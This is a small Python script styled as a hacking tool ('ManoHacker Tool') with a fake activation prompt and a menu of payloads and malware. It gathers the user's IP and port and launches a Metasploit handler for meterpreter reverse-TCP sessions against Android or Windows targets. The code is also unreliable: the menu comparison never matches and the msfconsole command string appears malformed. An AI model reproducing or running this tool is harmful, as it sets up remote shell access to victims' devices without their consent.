import os
Activate = input ("Please Type Your Activation Code ==>  ")

if Activate == "A5DINVNDKSO9WE87FOKLO1":
    print ("Thanks For your Login ")

else:
    print ("Incorrect code Please Type Real Code : ")
    Activatee = input ("Type Your Activation Code : ")
    print ("Sucesfully Login..")

logo = '''
\033[1;36m███╗░░░███╗░█████╗░███╗░░██╗░█████╗░
████╗░████║██╔══██╗████╗░██║██╔══██╗
██╔████╔██║███████║██╔██╗██║██║░░██║
██║╚██╔╝██║██╔══██║██║╚████║██║░░██║
██║░╚═╝░██║██║░░██║██║░╚███║╚█████╔╝
╚═╝░░░░░╚═╝╚═╝░░╚═╝╚═╝░░╚══╝░╚════╝░
'''
print (logo)
print (logo)

print ('\033[1;31m >> Welcome For ManoHacker Tool !! >> Thanks For Your Login ! ..')
print ('============================================================')
print ("\033[1;31m | Choose Option")
print ('=============================================================')
print("\033[1;32m 1- | Payloads")
print("\033[1;32m 2- | Malwares (Maintenance)")

Option = input ("\033[1;33m Enter Your Option ===> : ")
print ('=======================================================')
if Option == 1:
    os.system("clear")
payload = input("\033[1;31mPAYLOAD TYPE ANDROID / WINDOWS : ")
os.system("ifconfig")
ip = input("\033[1;34m[===>] YOUR IP :  ")
port = input("\033[1;33m[===>] PORT ")
os.system("msfconsole -q -x "'"handler -p '+payload+"/meterpreter/reverse_tcp -H $lhost "+ip+ " -P $lport "+port+'"')